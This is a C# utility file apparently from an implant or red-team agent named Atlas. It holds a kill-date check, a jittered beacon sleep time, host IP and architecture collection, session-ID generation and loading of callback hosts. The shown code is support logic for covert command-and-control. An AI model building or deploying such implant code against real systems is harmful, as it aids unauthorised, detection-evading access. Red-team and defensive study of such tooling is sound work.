using System;
using System.Collections.Generic;
using System.Threading;
using System.Net;
using System.Text.RegularExpressions;
using System.Text;
using System.Linq;
using System.IO;

namespace Atlas
{
    public class Utils
    {
        public static bool CheckDate()
        {
            try
            {
                DateTime kill = DateTime.Parse(Config.KillDate);
                DateTime date = DateTime.Today;
                if (DateTime.Compare(kill, date) >= 0)
                {
                    return true;
                }

                else
                {
                    return false;
                }
            }
            catch
            {
                return true;
            }
        }

        public static int GetDwellTime()
        {
            double High = Config.Sleep + (Config.Sleep * (Config.Jitter * 0.01));
            double Low = Config.Sleep - (Config.Sleep * (Config.Jitter * 0.01));
            Random random = new Random();
            int Dwell = random.Next(Convert.ToInt32(Low), Convert.ToInt32(High));
            return Dwell * 1000;
        }

        public static string GetIPAddress()
        {
            IPHostEntry Host = default(IPHostEntry);
            string Hostname = null;
            Hostname = System.Environment.MachineName;
            Host = Dns.GetHostEntry(Hostname);
            string ip = "";
            foreach (IPAddress IP in Host.AddressList)
            {
                if (IP.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    ip = Convert.ToString(IP);
                }
            }
            return ip;
        }

        public static string GetArch()
        {
            string arch = "";
            if (IntPtr.Size == 8)
            {
                arch = "x64";
            }
            else
            {
                arch = "x86";
            }
            return arch;
        }

        public static string GetSessionId()
        {
            Random random = new Random();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, 20).Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static void GetServers()
        {
            foreach (string domain in Config.CallbackHosts)
            {
                Messages.Server server = new Messages.Server
                {
                    domain = domain,
                    count = 0
                };
                Config.Servers.Add(server);
            }
        }
    }
}
